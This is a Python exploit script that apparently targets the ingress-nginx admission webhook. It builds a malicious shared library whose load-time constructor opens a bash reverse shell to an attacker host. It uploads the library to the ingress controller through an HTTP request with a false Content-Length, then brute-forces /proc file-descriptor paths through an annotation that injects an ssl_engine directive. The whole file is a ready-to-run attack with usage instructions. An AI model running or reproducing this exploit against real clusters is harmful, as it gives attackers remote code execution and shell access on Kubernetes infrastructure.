import aiohttp
import asyncio
import sys
from urllib.parse import urlparse
import os
import json

SHELL = """
#include <stdlib.h>

__attribute__((constructor))
void run_on_load() {
    system("bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'");
}

int bind(void *e, const char *id) {
    return 1;
}

void ENGINE_load_evil() {}

int bind_engine() {
    return 1;
}
"""

data_req = json.loads("""
{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "e166d137-ff47-443f-9108-9eb42e9738e8",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "eumesmo",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "0e484028-0d13-4d6a-9267-92e4a5e2c801"
    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "eumesmo",
        "namespace": "default",
        "creationTimestamp": null,
        "annotations": {
          "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../REPLACE;\n#",
          "nginx.ingress.kubernetes.io/auth-tls-secret": "calico-system/node-certs",
          "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
        }
      },
      "spec": {
        "rules": [
          {
            "host": "qmx.lab",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "nginx",
                      "port": {
                        "number": 80
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
""")

async def create_lib(host, port):
    with open("lib_template.c", "w") as f:
        f.write(SHELL.replace("HOST", host).replace("PORT", port))
    
    process = os.system("gcc -fPIC -Wall -shared -o evil_engine.so lib_template.c -lcrypto")
    if process == 0:
        print("[+] Shared object compiled successfully")
        return True
    else:
        print("[+] Error compiling shared object - gcc is installed?")
        sys.exit(0)

async def send_request(session, admission_url, json_data, proc, fd):
    print(f"Trying Proc: {proc}, FD: {fd}")
    path = f"proc/{proc}/fd/{fd}"
    replaced_data = json_data.replace("REPLACE", path)
    
    headers = {
        "Content-Type": "application/json"
    }
    
    full_url = admission_url.rstrip("/") + "/admission"
    
    try:
        async with session.post(full_url, data=replaced_data, headers=headers, ssl=False, timeout=5) as response:
            print(f"Response for /proc/{proc}/fd/{fd}: {response.status}")
    except Exception as e:
        print(f"Error on /proc/{proc}/fd/{fd}: {e}")

async def admission_brute(admission_url, max_workers=3):
    async with aiohttp.ClientSession() as session:
        json_data = json.dumps(data_req)
        
        tasks = []
        for proc in range(1, 50):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                tasks.append(send_request(session, admission_url, json_data, proc, fd))
        
        await asyncio.gather(*tasks)

async def exploit(ingress_url):
    with open("evil_engine.so", "rb") as f:
        evil_engine = f.read()
    
    real_length = len(evil_engine)
    fake_length = real_length + 10
    url = ingress_url
    
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    reader, writer = await asyncio.open_connection(host, port)
    
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: qmx-ingress-exploiter\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("iso-8859-1")
    
    http_payload = headers + evil_engine
    writer.write(http_payload)
    
    response = await reader.read(4096)
    print("[*] Response:")
    print(response.decode(errors="ignore"))
    
    writer.close()
    await writer.wait_closed()

async def main():
    if len(sys.argv) < 4:
        print("Usage: python3 exploit.py <ingress_url> <admission_webhook_url> <rev_host:port>")
        sys.exit(0)
    else:
        ingress_url = sys.argv[1]
        admission = sys.argv[2]
        
        if ":" not in sys.argv[3]:
            print("Invalid rev_host:port")
            sys.exit(0)
        
        host, port = sys.argv[3].split(":")
        result = await create_lib(host, port)
        if result:
            await asyncio.gather(
                exploit(ingress_url),
                admission_brute(admission) 
            )

if __name__ == "__main__":
    asyncio.run(main())